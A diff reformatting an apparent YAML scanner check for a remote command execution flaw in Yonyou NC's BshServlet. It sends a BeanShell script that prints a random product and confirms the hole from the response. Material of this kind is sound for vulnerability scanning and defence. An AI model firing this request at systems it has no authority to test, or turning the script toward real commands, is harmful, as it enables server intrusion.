@@ -1,23 +1,21 @@
-expression: r0()
 id: yonyou-nc-bsh-servlet-bshservlet-rce
+
 info:
-  author: B1anda0
-  description: "\u7528\u53CB NC bsh.servlet.BshServlet \u5B58\u5728\u8FDC\u7A0B\u547D\
-    \u4EE4\u6267\u884C\u6F0F\u6D1E\uFF0C\u901A\u8FC7BeanShell \u6267\u884C\u8FDC\u7A0B\
-    \u547D\u4EE4\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650 icon_hash=\"1085941792\""
-  name: "\u7528\u53CB NC bsh.servlet.BshServlet \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\
-    \u6F0F\u6D1E"
-  reference:
-  - https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A
-  severity: critical
-rules:
-  r0:
-    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
-      * r2)))
-    request:
-      body: bsh.script=print%28{{r1}}*{{r2}}%29%3B
-      method: POST
-      path: /servlet/~ic/bsh.servlet.BshServlet
+    name: 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞
+    author: B1anda0
+    severity: critical
+    description: 用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限 icon_hash="1085941792"
+    reference:
+        - https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A
+
 set:
-  r1: randomInt(8000, 9999)
-  r2: randomInt(8000, 9999)
+    r1: randomInt(8000, 9999)
+    r2: randomInt(8000, 9999)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /servlet/~ic/bsh.servlet.BshServlet
+            body: bsh.script=print%28{{r1}}*{{r2}}%29%3B
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
